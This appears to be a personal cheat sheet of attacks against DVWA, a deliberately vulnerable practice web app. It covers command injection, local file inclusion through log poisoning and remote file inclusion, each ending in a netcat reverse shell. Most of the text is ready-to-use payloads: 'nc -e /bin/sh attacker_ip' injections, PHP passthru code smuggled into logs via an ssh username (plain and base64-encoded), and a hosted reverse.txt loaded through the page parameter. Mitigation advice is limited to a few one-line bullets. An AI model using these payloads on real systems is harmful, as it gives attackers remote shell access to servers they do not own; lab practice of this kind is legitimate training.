**Based on DVWA Command Execution**
**Exploiting basic code execution**
```cmd
nc -vv -l -p 8080
# for low
ip_for_ping; nc -e /bin/sh attacker_ip 8080
# for medium
ip_for_ping | nc -e /bin/sh attacker_ip 8080
```
**Mitigation code execution**
> Don't use dengerous functions.
> Filter user input before execution.


**Shell from Local File Inclusion**
> Try to inject code into readable files
> /proc/self/environ
> /var/log/auth.log
> /var/log/apache2/access.log

```cmd
#in attack mechine
nc -vv -l -p 8888

#inject in site
<?passthru("nc -e /bin/sh attacker_ip 8888")?>
#base64_encode nc -e /bin/sh attacker_ip 8888 = bmMgLWUgL2Jpbi9zaCAxOTIuMTk2LjMwLjIxMiA4ODg4

ssh "<?passthru(base64_decode('bmMgLWUgL2Jpbi9zaCAxOTIuMTk2LjMwLjIxMiA4ODg4'));?>"@45.114.84.185
```


**Remote File Inclusion**
```cmd
#If allow_url_fopen = On in php.ini
<?php
passthru("nc -e /bin/sh attacker_ip 8888");
?>
#save to a domain or real ip as reverse.txt.

#listen in attack mechine
nc -vv -l -p 8888 

#hit in vulnerable mechine
10.20.14.204/dvwa/vulnerabilities/fi/?page=http://domain_or_real_ip/reverse.txt?

#another
10.20.14.204/dvwa/vulnerabilities/fi/?page=hTTp://domain_or_real_ip/reverse.txt?
```

**Mitigation File Inclusion**
> Prevent remote file inclusion
> > Disable allow_url_fopen
> > Disable allow_url_include

> Prevent local file inclusion
> > Use static file inclusion